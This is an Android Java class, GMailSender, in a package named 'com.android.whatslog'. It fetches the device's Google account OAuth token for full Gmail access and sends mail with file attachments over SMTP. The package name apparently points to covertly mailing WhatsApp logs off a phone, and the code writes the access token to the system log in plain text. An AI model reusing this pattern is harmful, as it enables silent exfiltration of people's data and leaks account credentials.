package com.android.whatslog;

import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.URLName;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.accounts.AccountManagerCallback;
import android.accounts.AccountManagerFuture;
import android.content.Context;
import android.os.Bundle;
import android.util.Log;

import com.sun.mail.smtp.SMTPTransport;
import com.sun.mail.util.BASE64EncoderStream;

public class GMailSender {
	private Session session;
	private String token,user;
	private Multipart multipart;

	public String getToken() {
		return token;
	}

	public GMailSender(Context ctx) {
		super();
		multipart = new MimeMultipart();
		initToken(ctx);
	}

	public void initToken(Context ctx) {

		AccountManager am = AccountManager.get(ctx);

		Account[] accounts = am.getAccountsByType("com.google");
		for (Account account : accounts) {
			Log.d("getToken", "account=" + account);
		}

		Account me = accounts[0]; // You need to get a google account on the
									// device, it changes if you have more than
									// one
		user=me.name;
//		am.invalidateAuthToken("com.google", token);
		AccountManagerFuture<Bundle> ma = am.getAuthToken(me,"oauth2:https://mail.google.com/", true,
				new AccountManagerCallback<Bundle>() {
					@Override
					public void run(AccountManagerFuture<Bundle> result) {
						try {
							Bundle bundle = result.getResult();
							token = bundle.getString(AccountManager.KEY_AUTHTOKEN);
							Log.d("initToken callback", "token=" + token);

						} catch (Exception e) {
							Log.d("test", e.getMessage());
						}
					}
				}, null);

		Log.d("getToken", "token=" + token);
	}

	public SMTPTransport connectToSmtp(String host, int port, String userEmail,
			String oauthToken, boolean debug) throws Exception {

		Properties props = new Properties();
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.starttls.required", "true");
		props.put("mail.smtp.sasl.enable", "false");

		session = Session.getInstance(props);
		session.setDebug(debug);

		final URLName unusedUrlName = null;
		SMTPTransport transport = new SMTPTransport(session, unusedUrlName);
		// If the password is non-null, SMTP tries to do AUTH LOGIN.
		final String emptyPassword = null;

		/*
		 * enable if you use this code on an Activity (just for test) or use the
		 * AsyncTask StrictMode.ThreadPolicy policy = new
		 * StrictMode.ThreadPolicy.Builder().permitAll().build();
		 * StrictMode.setThreadPolicy(policy);
		 */

		transport.connect(host, port, userEmail, emptyPassword);

		byte[] response = String.format("user=%s\1auth=Bearer %s\1\1",
				userEmail, oauthToken).getBytes();
		response = BASE64EncoderStream.encode(response);

		transport.issueCommand("AUTH XOAUTH2 " + new String(response), 235);

		return transport;
	}

	public synchronized void sendMail(String subject, String body, String oauthToken, String recipients) {
		try {

			SMTPTransport smtpTransport = connectToSmtp("smtp.gmail.com", 587, user, oauthToken != null ? oauthToken : token, true);

			MimeMessage message = new MimeMessage(session);

//			DataHandler handler = new DataHandler(new ByteArrayDataSource(body.getBytes(), "text/plain"));

			message.setSender(new InternetAddress(user));
			message.setSubject(subject);
//			message.setDataHandler(handler);
			if (recipients.indexOf(',') > 0)
				message.setRecipients(Message.RecipientType.TO,
						InternetAddress.parse(recipients));
			else
				message.setRecipient(Message.RecipientType.TO,
						new InternetAddress(recipients));


			// setup message body
			BodyPart messageBodyPart = new MimeBodyPart();
			messageBodyPart.setText(body);
			multipart.addBodyPart(messageBodyPart);

			// Put parts in message
			message.setContent(multipart);

			smtpTransport.sendMessage(message, message.getAllRecipients());

		} catch (Exception e) {
			Log.d("test", e.getMessage(), e);
		}
	}

	public void addAttachment(String filename, String path) throws Exception {
		BodyPart messageBodyPart = new MimeBodyPart();
		DataSource source = new FileDataSource(path);
		messageBodyPart.setDataHandler(new DataHandler(source));
		messageBodyPart.setFileName(filename);

		multipart.addBodyPart(messageBodyPart);
	}

}